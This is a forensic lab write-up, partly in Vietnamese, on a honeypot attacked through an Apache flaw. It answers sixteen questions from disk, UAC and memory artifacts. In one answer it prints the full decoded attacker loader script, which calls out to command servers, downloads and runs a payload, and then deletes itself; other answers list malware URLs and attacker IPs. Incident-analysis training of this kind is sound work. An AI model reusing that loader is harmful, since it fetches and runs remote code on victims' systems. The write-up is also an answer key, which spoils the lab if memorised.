author: Azaki
published: published
created: 2026-09-10
tags: CyberDefener, Lab, Endpoint Forensic

This Ubuntu Linux honeypot was deployed in Azure in early October to monitor activities related to the exploitation of CVE-2021-41773.

Initially, the system attracted a significant number of cryptocurrency miners. To mitigate this, a cron script was implemented to remove files named "kinsing" in the /tmp directory. This action was taken to prevent these miners from interfering so that more interesting activities could be observed.

There are three key files available:  
- **sdb.vhd.gz**: This file is a Virtual Hard Disk (VHD) of the main drive, obtained through an Azure disk snapshot.  
- **ubuntu.20211208.mem.gz**: This file is a memory dump created using Lime.  
- **uac.tgz**: This file contains the results of User Account Control (UAC) running on the system.

The artifacts were collected in the following order: the drive was snapshotted first, followed by the memory dump, and finally, the UAC results were gathered.

---
<p style="text-align:right; font-style:italic;">
  Author: <b>@Tyler Hudak</b> 
</p>

# Part 1: sdb.vhd 
## Q1: There is a script that runs every minute to do cleanup. What is the name of the file?

**Yêu cầu:** Xác định tên tập tin script được thiết lập để chạy dọn dẹp mỗi phút.

Để kiểm tra các tác vụ tự động (cronjobs) hoặc các script chạy định kỳ, ta cần phân tích file nhật ký hệ thống. Mở thư mục `/var/log` và kiểm tra file `syslog`. Trong file log này, các bản ghi cho thấy có một lệnh cron đang thực thi một script liên tục mỗi phút. Tên của script này được hiển thị rõ trong log
![AzurePot Lab.png](./images/AzurePot%20Lab.png)

>.remove.sh

## Q2: The script in **Q1** terminates processes associated with two Bitcoin miner malware files. What is the name of 1st malware file?

**Yêu cầu:** Script ở câu Q1 đã xóa các file liên quan đến hai loại mã độc đào Bitcoin. Tên của mã độc đầu tiên là gì?

Kiểm tra nội dung của script `.remove.sh` vừa tìm được ở thư mục root (`/root`). Script này sử dụng vòng lặp `for` kết hợp với lệnh `kill -9` để buộc dừng (terminate) các tiến trình. Nó tìm kiếm các tiến trình chứa chuỗi cụ thể trong tên. Từ khóa đầu tiên mà nó nhắm đến để xóa trong biểu thức chính quy (egrep) chính là tên của mã độc![AzurePot Lab-1.png](./images/AzurePot%20Lab-1.png)

>kinsing

## Q3: The script changes the permissions for some files. What is their new permission?

**Yêu cầu:** Script này đã thay đổi quyền truy cập (permissions) của một số file. Quyền truy cập mới được cấp là gì?

Tiếp tục phân tích nội dung script `.remove.sh`, ở đoạn cuối cùng, tác giả đã sử dụng lệnh `chmod` để thay đổi quyền cho các file nằm trong `/tmp/k*`. Quyền mới được thiết lập là quyền chỉ đọc (read-only) cho tất cả mọi người
![AzurePot Lab-2.png](./images/AzurePot%20Lab-2.png)

>444

## Q4: What is the SHA256 of the botnet agent file?

**Yêu cầu:** Xác định giá trị mã băm SHA256 của tập tin botnet agent.

Mặc dù script tập trung dọn dẹp thư mục `/tmp`, nhưng đây chỉ là nơi chứa các tệp tạm thời. Một botnet agent chính thường được giấu ở một vị trí an toàn hơn để duy trì sự tồn tại (persistence). Tiến hành kiểm tra thư mục `/var/tmp/`, một thư mục lưu trữ tạm thời nhưng dữ liệu thường không bị xóa khi khởi động lại như `/tmp`. Tại đây, một tập tin có tên lạ và dung lượng khá lớn (48 KB) được phát hiện, rất phù hợp với đặc điểm của một botnet agent
![AzurePot Lab-3.png](./images/AzurePot%20Lab-3.png)

![AzurePot Lab-4.png](./images/AzurePot%20Lab-4.png)

Sử dụng lệnh `sha256sum` đối với file này, ta thu được mã băm của nó
![AzurePot Lab-5.png](./images/AzurePot%20Lab-5.png)

>0e574fd30e806fe4298b3cbccb8d1089454f42f52892f87554325cb352646049

## Q5:  What is the name of the botnet in **Q4**?

**Yêu cầu:** Tên của loại botnet này là gì?

Đem mã băm SHA256 vừa tìm được tra cứu trên cơ sở dữ liệu của VirusTotal. Kết quả phân tích tĩnh và động từ các engine chống virus (Crowdsourced YARA rules và Threat labels) đều đồng loạt định danh mẫu mã độc này
![AzurePot Lab-6.png](./images/AzurePot%20Lab-6.png)

>Tsunami

## Q6: What IP address matches the creation timestamp of the botnet agent file in **Q4**?

**Yêu cầu:** Địa chỉ IP nào khớp với thời điểm tạo tệp botnet agent ở câu Q4?

Trước tiên, cần xác định chính xác thời điểm tệp botnet `dk86` được tạo. Kiểm tra thuộc tính của tệp, thời gian tạo (Date Created) là `11/11/2021 7:09:51 PM`
![AzurePot Lab-7.png](./images/AzurePot%20Lab-7.png)

Để tìm địa chỉ IP tương ứng, chúng ta kiểm tra file `access_log` của Apache trong thư mục `/var/log/apache2`. Dò tìm các bản ghi log khớp với mốc thời gian vừa xác định (`11/Nov/2021:19:09:51`), ta trích xuất được địa chỉ IP nguồn đã kết nối đến máy chủ
![AzurePot Lab-8.png](./images/AzurePot%20Lab-8.png)

> 141.135.85.36

## Q7: What URL did the attacker use to download the botnet agent?

**Yêu cầu:** Attacker đã sử dụng URL nào để tải xuống botnet agent?

Tiếp tục phân tích file `error_log` của Apache để tìm kiếm các lệnh thực thi từ xa. Quét các log xảy ra ngay trước thời điểm tạo file botnet, ta phát hiện một lệnh `wget` được sử dụng để tải xuống tập tin từ một URL cụ thể, và sau đó cấp quyền thực thi (`chmod +x`) cho tập tin tải về đó. Tên tập tin được lưu cũng chính là `dk86`
![AzurePot Lab-9.png](./images/AzurePot%20Lab-9.png)

>http://138.197.206.223:80/wp-content/themes/twentysixteen/dk86

## Q8: What is the name of the file that the attacker downloaded to execute the malicious script and subsequently remove itself?

**Yêu cầu:** Tên của tập tin mà attacker tải xuống để thực thi script độc hại và sau đó tự động xóa đi là gì?

Thay vì chỉ tìm kiếm lệnh `rm -rf`, cần phân tích sâu hơn các chuỗi lệnh tải xuống (`wget` hoặc `curl`) sau khi cài đặt botnet. Trong các log, có một chuỗi lệnh tải về tệp `b64.php` và thực thi giải mã base64
![AzurePot Lab-10.png](./images/AzurePot%20Lab-10.png)

Giải mã đoạn mã base64 đầu tiên bằng CyberChef, kết quả trả về một đoạn mã khác kèm theo lệnh cấp quyền và thực thi một tập tin. Đoạn lệnh giải mã này cho thấy tiến trình sẽ lưu đầu ra vào tệp `.install`, thay đổi quyền truy cập (`chmod +x`), và sau đó chạy tệp `.install` này. Đoạn mã cũng chứa logic tìm kiếm một thư mục có quyền ghi, tạo các thư mục ẩn, và giả mạo một tập tin `.pinfo` với nội dung `apache`
![AzurePot Lab-11.png](./images/AzurePot%20Lab-11.png)

Khi giải mã tiếp đoạn base64 thứ hai (nội dung của tệp `.install`), ta thu được mã nguồn bash hoàn chỉnh. Ở cuối kịch bản (script) này, ta có thể thấy rõ các lệnh dọn dẹp, bao gồm lệnh tải xuống `.src.sh`, thực thi nó, và ngay lập tức sử dụng lệnh `rm -rf .install` để xóa chính tập tin `.install` nhằm xóa dấu vết

```bash
PATH=/sbin:/bin:/usr/sbin:/usr/bin:/usr/local/bin
CURL="curl"
DOM="rr.blueheaven.live"

pkill -9 -f ".src.sh"
pkill -9 -f "pproxy"
out=$(curl -s --connect-timeout 5 http://rr.blueheaven.live/1010/online.php -u client:%@123-456@% 2> /dev/null)
enable=$(echo $out | awk '{split($0,a,","); print a[1]}')
online=$(echo $out | awk '{split($0,a,","); print a[2]}')
if [ ! "$enable" -eq "1" -a ! "$online" -eq "1" ]; then
	ifaces=""
	if [ "$(command -v ip 2> /dev/null)" ]; then
		ifaces=$(ip -4 -o a | cut -d ' ' -f 2,7 | cut -d '/' -f 1 | awk -F' ' '{print $1}' | tr '\n' ' ')
	else
		if [ "$(command -v ifconfig 2> /dev/null)" ]; then
			ifaces=$(ifconfig -a | grep flags | awk '{split($0,a,":"); print a[1]}' | tr '\n' ' ')
		fi
	fi
	for eth in $ifaces; do
		out=$(curl -s --interface $eth --connect-timeout 5 http://116.203.212.184/1010/online.php -u client:%@123-456@% 2> /dev/null)
		enable=$(echo $out | awk '{split($0,a,","); print a[1]}')
		online=$(echo $out | awk '{split($0,a,","); print a[2]}')
		if [ "$enable" == "1" -a "$online" == "1" ]; then
			echo "$eth" > .interface
			break
		fi
	done
fi

if [ -f ".interface" ]; then
	CURL="curl --interface "$(cat .interface 2> /dev/null)
	DOM="116.203.212.184"
fi

out=$($CURL -s http://$DOM/1010/src.php -u client:%@123-456@% 2> /dev/null)
enable=$(echo $out | awk '{split($0,a,","); print a[1]}')
base=$(echo $out | awk '{split($0,a,","); print a[2]}')
if [ "$enable" -eq "1" ]; then
	rm -rf .miniconda.sh .api .ipid .spid .cron.sh .src.sh; $CURL -s http://$DOM/1010/b64.php -u client:%@123-456@% --data-urlencode "s=$base" -o .src.sh 2> /dev/null && chmod +x .src.sh > /dev/null 2>&1
	sh .src.sh > /dev/null 2>&1 &
fi
rm -rf .install
```

Tại đoạn cuối của file lúc này lệnh **rm -rf** mới xuất hiện và đồng thời củng cố thêm sự chắc chắn rằng đây là file thực thi cần tìm
![AzurePot Lab-12.png](./images/AzurePot%20Lab-12.png)

>.install

## Q9: The attacker downloaded SH scripts. What are the names of these files?

**Yêu cầu:** Attacker đã tải xuống các script shell (.sh). Tên của những tập tin này là gì?

Tiếp tục dò tìm trong file `error_log` với từ khóa lệnh tải xuống `wget`, ta xác định được danh sách ba tập tin shell script (có đuôi `.sh`) mà attacker đã lấy về.
- Tập tin đầu tiên: 0_cron.sh
![AzurePot Lab-13.png](./images/AzurePot%20Lab-13.png)

- Tập tin thứ hai: 0_linux.sh
![AzurePot Lab-14.png](./images/AzurePot%20Lab-14.png)

- Tập tin thứ ba: ap.sh
![AzurePot Lab-15.png](./images/AzurePot%20Lab-15.png)

>0_cron.sh, 0_linux.sh, ap.sh

# Part 2: UAC
## Q10: Two suspicious processes were running from a deleted directory. What are their PIDs?

**Yêu cầu:** Tìm PID của hai tiến trình đáng ngờ đang chạy từ một thư mục đã bị xóa.

Để tìm các tiến trình liên quan đến các tập tin hoặc thư mục đã bị xóa, chúng ta sẽ kiểm tra kết quả thu thập được từ công cụ UAC (`uac.tgz`), đặc biệt là thư mục `live_response`. Trong thư mục này, tìm đến tập tin `lsof_-nPl.txt`. Tập tin này ghi lại kết quả của lệnh `lsof` (List Open Files), giúp liệt kê tất cả các tệp đang được mở bởi các tiến trình đang chạy
![AzurePot Lab-16.png](./images/AzurePot%20Lab-16.png)

Tiến hành tìm kiếm bên trong tệp `lsof_-nPl.txt` với từ khóa `deleted`. Kết quả cho thấy có hai tiến trình thuộc tệp `.spoollog` đang thực thi từ một thư mục đã bị xóa.
Hai tiến trình này có Process ID (PID) là:
- 6388
![AzurePot Lab-17.png](./images/AzurePot%20Lab-17.png)

- 20645
![AzurePot Lab-18.png](./images/AzurePot%20Lab-18.png)

>6388, 20645

## Q11: What is the suspicious command line associated with the PID that ends with **``45``** in **Q10**?

**Yêu cầu:** Dòng lệnh (command line) đáng ngờ nào được liên kết với PID kết thúc bằng "45" ở câu Q10?

Từ câu Q10, ta xác định được PID kết thúc bằng "45" là `20645`. Để xem chi tiết dòng lệnh đã được sử dụng để khởi chạy tiến trình này, ta cần xem lại tập tin ghi log hoạt động của hệ thống, cụ thể là tệp `ps_-ef.txt` trong cùng thư mục `live_response`. Tệp này ghi lại danh sách đầy đủ các tiến trình đang chạy
![AzurePot Lab-19.png](./images/AzurePot%20Lab-19.png)

Tiến hành tra cứu PID `20645` trong tệp này, ta tìm được dòng lệnh thực thi tương ứng ở cột cuối cùng
![AzurePot Lab-20.png](./images/AzurePot%20Lab-20.png)

>sh .src.sh
## Q12: UAC gathered some data from the second process in **Q10**. What is the remote IP address and remote port that was used in the attack?

**Yêu cầu:** UAC đã thu thập dữ liệu từ tiến trình thứ hai ở câu Q10 (PID 20645). Địa chỉ IP và cổng từ xa (remote port) nào đã được sử dụng trong cuộc tấn công?

Để điều tra sâu hơn về tiến trình `20645`, ta điều hướng vào hệ thống tệp tin ảo (`/proc`) được lưu trữ trong dữ liệu UAC. Mở đường dẫn `process/proc/20645`. Thư mục này chứa thông tin cấu hình và trạng thái của tiến trình khi nó đang chạy
![AzurePot Lab-21.png](./images/AzurePot%20Lab-21.png)

Tiếp theo, ta cần xem nội dung của tập tin `environ.txt` trong thư mục này. Tập tin này chứa các biến môi trường được truyền cho tiến trình khi nó khởi chạy
![AzurePot Lab-22.png](./images/AzurePot%20Lab-22.png)

Kiểm tra nội dung tập tin cấu hình môi trường, ta thấy rõ các tham số mạng được kết nối. Tại đây, ta trích xuất được Remote IP (`REMOTE_ADDR`) và Remote Port (`REMOTE_PORT`) của kẻ tấn công

>116.202.187.77:56590

## Q13: Which user was responsible for executing the command in **Q11**?

**Yêu cầu:** Người dùng (user) nào đã thực thi dòng lệnh ở câu Q11?

Quay trở lại tệp tin `ps_-ef.txt` mà ta đã sử dụng để tìm kiếm dòng lệnh ở Q11. Kiểm tra lại dòng thông tin của tiến trình `20645`, cột đầu tiên hiển thị tên tài khoản người dùng đã khởi chạy tiến trình này
![AzurePot Lab-23.png](./images/AzurePot%20Lab-23.png)

>daemon
## Q14: Two suspicious shell processes were running from the **`tmp`** folder. What are their PIDs?

**Yêu cầu:** Hai tiến trình shell đáng ngờ đang chạy từ thư mục `tmp`. PID của chúng là gì?

Lần này, thay vì tìm trong thư mục bị xóa (`deleted`), chúng ta sẽ tìm kiếm các tiến trình đang chạy trực tiếp từ thư mục `/tmp`. Tiếp tục sử dụng tệp `lsof_-nPl.txt`, ta tìm kiếm các bản ghi với từ khóa `/tmp` kết hợp với loại lệnh là shell (`sh`). Quá trình tìm kiếm này phát hiện hai tiến trình thỏa mãn điều kiện.
PID của hai tiến trình này là:
- 21785
![AzurePot Lab-24.png](./images/AzurePot%20Lab-24.png)

- 15853
![AzurePot Lab-25.png](./images/AzurePot%20Lab-25.png)

>15853, 21785

# Part 3: ubuntu.20211208.mem
## Q15: What is the MAC address of the captured memory?

**Yêu cầu:** Địa chỉ MAC của bộ nhớ được chụp là gì?

Để phân tích bản sao chép bộ nhớ (memory dump) của hệ thống Ubuntu bằng Volatility 3, chúng ta cần cài đặt thêm các gói hỗ trợ. Đầu tiên, cần tải tool [dwarf2json](https://github.com/volatilityfoundation/dwarf2json.git) để chuyển đổi tệp gỡ lỗi. Tiếp theo, tải gói thông tin gỡ lỗi (debug package) dành riêng cho phiên bản kernel của Azure là [ubuntu-5.4.0-1059-azure](http://ddebs.ubuntu.com/pool/main/l/linux-azure-5.4/linux-image-unsigned-5.4.0-1059-azure-dbgsym_5.4.0-1059.62~18.04.1_amd64.ddeb) 

Sau khi đã nạp đầy đủ các tệp symbol cần thiết, ta sử dụng plugin `linux.ip.Link` để truy xuất thông tin cấu hình mạng từ bộ nhớ. Kết quả phân tích trả về cấu hình của card mạng `eth0`, bao gồm cả địa chỉ MAC vật lý
![AzurePot Lab-26.png](./images/AzurePot%20Lab-26.png)

>00:22:48:26:3b:16
## Q16: Based on Bash history. The attacker downloaded the SH script. What is the name of the file?

**Yêu cầu:** Dựa trên lịch sử Bash, attacker đã tải xuống một SH script. Tên của tập tin đó là gì?

Để kết thúc chuỗi điều tra, ta sẽ tìm kiếm dấu vết cuối cùng trong lịch sử dòng lệnh được lưu trong bộ nhớ. Sử dụng plugin `linux.bash` của Volatility để trích xuất nội dung `bash_history`. Kết hợp với việc tìm kiếm các từ khóa lệnh tải xuống quen thuộc như `wget` và `curl`, ta phát hiện một lệnh `wget` được attacker sử dụng để tải một tệp shell script trực tiếp từ IP `185.191.32.198
![AzurePot Lab-27.png](./images/AzurePot%20Lab-27.png)

> unk.sh